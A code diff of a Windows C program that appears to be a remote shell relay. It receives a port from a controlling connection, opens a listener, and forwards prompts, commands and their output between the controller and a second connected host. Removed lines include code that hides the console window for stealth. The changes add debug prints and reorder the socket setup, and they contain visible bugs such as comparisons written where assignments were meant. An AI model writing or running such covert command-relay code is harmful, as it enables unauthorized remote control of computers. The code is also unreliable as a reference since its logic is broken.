@@ -3,10 +3,10 @@
 
 int main(int argc ,char *argv[])
 {
-	HWND stealth;
+	/*HWND stealth;
 	AllocConsole();
 	stealth=FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
+	ShowWindow(stealth, 0);*/
 
 	int portno;
 	char portchar[6];
@@ -97,14 +97,9 @@ int main(int argc ,char *argv[])
 
 	int cportno;
 	int nc;
-	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if(sock == INVALID_SOCKET){
-		WSACleanup();
-		return 1;
-	}
 
 	if(cn != SOCKET_ERROR){
-
+		printf("Sending ui");
 		*pbs = send(s, ui, BUFSIZE, 0);
 		if( *pbs == SOCKET_ERROR ){
 			if(WSAGetLastError() != WSAECONNREFUSED
@@ -115,6 +110,8 @@ int main(int argc ,char *argv[])
 			}
 		}
 
+		printf("Sending port\n");
+		memset(buf, 0, BUFSIZE);
 		strcpy(buf, "[*] Send the port:");
 		*pbs = send(s, buf, BUFSIZE, 0);
                 if( *pbs == SOCKET_ERROR ){
@@ -137,55 +134,37 @@ int main(int argc ,char *argv[])
 				return -1;
 			} else {
 				cportno = atoi(buf);
+				printf("%d\n", cportno);
 			}
 		}
-
-		memset(buf, 0, BUFSIZE);
-		strcpy(buf, "[*] Are you using netcat?(y/n)");
-                *pbs = send(s, buf, BUFSIZE, 0);
-                if( *pbs == SOCKET_ERROR ){
-                        if(WSAGetLastError() != WSAECONNREFUSED
-                        || WSAGetLastError() == WSAECONNRESET){
-                                return 0;
-                        } else {
-                                return 1;
-                        }
-                }
-
-		memset(buf, 0, BUFSIZE);
-                while(*pbr == SOCKET_ERROR){
-                        *pbr = recv(s, buf, BUFSIZE, 0);
-                        if(*pbr == 0 || *pbr == WSAECONNRESET){
-                                break;
-                        }
-
-                        if(bytesRecv < 0){
-                                return -1;
-                        } else {
-                                if(buf[0] == 'n'){
-					nc = 0;
-				} else {
-					nc = 1;
-				}
-                        }
-                }
-
-
 	}
 
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if(sock == INVALID_SOCKET){
+		WSACleanup();
+		return 1;
+	}
+
+	printf("Creating server");
 	struct sockaddr_in server;
 	server.sin_family = AF_INET;
 	server.sin_addr.s_addr = INADDR_ANY;
 	server.sin_port = htons(cportno);
 
+	char buffer[BUFSIZE];
+
 	if(bind(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR){
 		printf("bind failed");
+		getchar();
 		return 0;
 	}
+	printf("bind done\n");
 
 	if(listen(sock, 10) == SOCKET_ERROR){
 		printf("listen error listening to socket");
+		getchar();
 	}
+	printf("listening\n");
 
 	SOCKET as;
 	while(1){
@@ -198,119 +177,117 @@ int main(int argc ,char *argv[])
 		break;
 	}
 
-	if(nc){
-		memset(buf, 0, BUFSIZE);
-                strcpy(buf, "0");
-                *pbs = send(sock, buf, BUFSIZE, 0);
-                if( *pbs == SOCKET_ERROR ){
-                        if(WSAGetLastError() != WSAECONNREFUSED
-                        || WSAGetLastError() == WSAECONNRESET){
-                                return 0;
-                        } else {
-                                return 1;
-                        }
+	printf("Sending 0 to host\n");
+	memset(buffer, 0, BUFSIZE);
+        buffer[0] = '0';
+        *pbs = send(sock, buffer, BUFSIZE, 0);
+        if( *pbs == SOCKET_ERROR ){
+                if(WSAGetLastError() != WSAECONNREFUSED
+                || WSAGetLastError() == WSAECONNRESET){
+                        return 0;
+                } else {
+                        return 1;
                 }
+        }
+	printf("DONE\n");
 
+	printf("RECV UI\n" );
+	memset(buffer, 0, BUFSIZE);
+	*pbr == SOCKET_ERROR;
+	while( *pbr == SOCKET_ERROR ){
+		*pbr = recv(sock, buffer, BUFSIZE, 0);
+		if( *pbr == 0 || *pbr == WSAECONNRESET){
+			break;
+		}
 
-		memset(buf, 0, BUFSIZE);
-		while( *pbr == SOCKET_ERROR ){
-			*pbr = recv(sock, buf, BUFSIZE, 0);
-			if( *pbr == 0 || *pbr == WSAECONNRESET){
-				break;
-			}
-
-			if(*pbr < 0){
-				return -1;
-			} else {
-				*pbs = send(s, buf, BUFSIZE, 0);
-				if( *pbs == SOCKET_ERROR ){
-					if(WSAGetLastError() != WSAECONNREFUSED
-					|| WSAGetLastError() != WSAECONNRESET){
-						return 0;
-					} else {
-						return 1;
-					}
+		if(*pbr < 0){
+			return -1;
+		} else {
+			*pbs = send(s, buffer, BUFSIZE, 0);
+			if( *pbs == SOCKET_ERROR ){
+				if(WSAGetLastError() != WSAECONNREFUSED
+				|| WSAGetLastError() != WSAECONNRESET){
+					return 0;
+				} else {
+					return 1;
 				}
 			}
 		}
+	}
+	printf("DONE\n");
 
-		while(cn != SOCKET_ERROR){
-			//prompt
-			memset(buf, 0, BUFSIZE);
-	                while(*pbr == SOCKET_ERROR){
-	                        *pbr = recv(sock, buf, BUFSIZE, 0);
-	                        if(*pbr == 0 || *pbr == WSAECONNRESET){
-	                                break;
-	                        }
-
-	                        if(bytesRecv < 0){
-	                                return -1;
-	                        } else {
-	                 		memset(buf, 0, BUFSIZE);
-					*pbs = send(s, buf, BUFSIZE, 0);
-			                if( *pbs == SOCKET_ERROR ){
-                        			if(WSAGetLastError() != WSAECONNREFUSED
-                        			|| WSAGetLastError() == WSAECONNRESET){
-                        			        return 0;
-                        			} else {
-                        			        return 1;
-                        			}
-                			}
-
-
-	                        }
+	while(cn != SOCKET_ERROR){
+		//prompt
+		memset(buffer, 0, BUFSIZE);
+		*pbr == SOCKET_ERROR;
+	        while(*pbr == SOCKET_ERROR){
+	                *pbr = recv(sock, buffer, BUFSIZE, 0);
+	                if(*pbr == 0 || *pbr == WSAECONNRESET){
+	                        break;
 	                }
-			//recv cmd
-			memset(buf, 0, BUFSIZE);
-                        while(*pbr == SOCKET_ERROR){
-                                *pbr = recv(s, buf, BUFSIZE, 0);
-                                if(*pbr == 0 || *pbr == WSAECONNRESET){
-                                        break;
-                                }
 
-                                if(bytesRecv < 0){
-                                        return -1;
-                                } else {
-					memset(buf, 0, BUFSIZE);
-                                        *pbs = send(sock, buf, BUFSIZE, 0);
-                                        if( *pbs == SOCKET_ERROR ){
-                                                if(WSAGetLastError() != WSAECONNREFUSED
-                                                || WSAGetLastError() == WSAECONNRESET){
-                                                        return 0;
-                                                } else {
-                                                        return 1;
-                                                }
+	                if(bytesRecv < 0){
+	                        return -1;
+	                } else {
+	                 	memset(buffer, 0, BUFSIZE);
+				*pbs = send(s, buffer, BUFSIZE, 0);
+			        if( *pbs == SOCKET_ERROR ){
+                        		if(WSAGetLastError() != WSAECONNREFUSED
+                        		|| WSAGetLastError() == WSAECONNRESET){
+                        		        return 0;
+                        		} else {
+                        		        return 1;
+                        		}
+                		}
+	                }
+	        }
+		//recv cmd
+		memset(buffer, 0, BUFSIZE);
+		*pbr == SOCKET_ERROR;
+                while(*pbr == SOCKET_ERROR){
+                        *pbr = recv(s, buffer, BUFSIZE, 0);
+                        if(*pbr == 0 || *pbr == WSAECONNRESET){
+                                break;
+                        }
+
+                        if(bytesRecv < 0){
+                                return -1;
+                        } else {
+                                *pbs = send(sock, buffer, BUFSIZE, 0);
+                                if( *pbs == SOCKET_ERROR ){
+                                        if(WSAGetLastError() != WSAECONNREFUSED
+                                        || WSAGetLastError() == WSAECONNRESET){
+                                                return 0;
+                                        } else {
+                                                return 1;
                                         }
+                        	}
+                        }
+                }
+		//recv output
+		memset(buf, 0, BUFSIZE);
+		*pbr == SOCKET_ERROR;
+                while(*pbr == SOCKET_ERROR){
+                        *pbr = recv(sock, buffer, BUFSIZE, 0);
+                        if(*pbr == 0 || *pbr == WSAECONNRESET){
+                                break;
+                        }
 
+                        if(bytesRecv < 0){
+                                return -1;
+                        } else {
 
+                                *pbs = send(s, buffer, BUFSIZE, 0);
+                                if( *pbs == SOCKET_ERROR ){
+                                        if(WSAGetLastError() != WSAECONNREFUSED
+                                        || WSAGetLastError() == WSAECONNRESET){
+                                                return 0;
+					} else {
+                                                return 1;
+                                        }
                                 }
                         }
-			//recv output
-			memset(buf, 0, BUFSIZE);
-                        while(*pbr == SOCKET_ERROR){
-                                *pbr = recv(sock, buf, BUFSIZE, 0);
-                                if(*pbr == 0 || *pbr == WSAECONNRESET){
-                                        break;
-                                }
-
-                                if(bytesRecv < 0){
-                                        return -1;
-                                } else {
-
-                                        *pbs = send(s, buf, BUFSIZE, 0);
-                                        if( *pbs == SOCKET_ERROR ){
-                                                if(WSAGetLastError() != WSAECONNREFUSED
-                                                || WSAGetLastError() == WSAECONNRESET){
-                                                        return 0;
-                                                } else {
-                                                        return 1;
-                                                }
-                                        }
-
-
-                                }
-                        }
-		}
+                }
 	}
 
 	close:
